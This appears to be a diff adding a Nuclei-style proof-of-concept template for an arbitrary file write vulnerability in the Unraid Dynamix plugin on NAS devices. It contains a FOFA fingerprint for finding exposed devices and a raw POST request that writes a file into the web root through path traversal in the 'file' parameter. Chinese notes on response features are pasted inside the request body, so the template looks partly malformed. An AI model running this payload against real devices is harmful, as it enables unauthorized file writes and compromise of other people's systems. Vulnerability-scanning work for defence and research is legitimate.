@@ -1,0 +1,39 @@
+id: poc-zc6zkodrh2r3sbki
+info:
+  name: NAS设备 unraid Dynamix 插件 任意文件写入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zc6zkodrh2r3sbki'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zc6zkodrh2r3sbki
+    fofa: '"/webGui/images/banner.png"'
+http:
+- raw:
+  - 'POST /plugins/dynamix/include/SelectCase.php?file=../../../../usr/local/emhttp/dudesite.txt HTTP/1.1
+
+
+
+
+    csrf_token=9855BE5478D13A31&mode=set&model=Bypass 2021
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /dudesite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
